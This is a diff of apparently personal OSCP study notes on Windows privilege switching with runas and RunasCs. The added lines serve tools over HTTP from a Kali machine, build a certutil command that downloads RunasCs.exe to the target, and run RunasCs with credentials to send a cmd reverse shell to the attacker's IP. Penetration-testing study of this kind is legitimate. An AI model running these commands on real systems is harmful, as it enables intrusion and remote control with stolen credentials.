@@ -1,4 +1,25 @@
+Runas is to switch users with creds
+
 **`runas`** command when you **already possess a set of valid credentials** (username and password) for another user account on the target system and want to execute a command or launch a shell under that user's security context.
+
+```
+cd ~/Desktop/Tools/Windows && python -m http.server 80
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil -urlcache -split -f http://${KaliIP}:80/RunasCs.exe RunasCs.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `.\RunasCs.exe [user] [pw] -r ${KaliIP}:[port] cmd`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
 
 Invoke-RunasCs.ps1
 ```
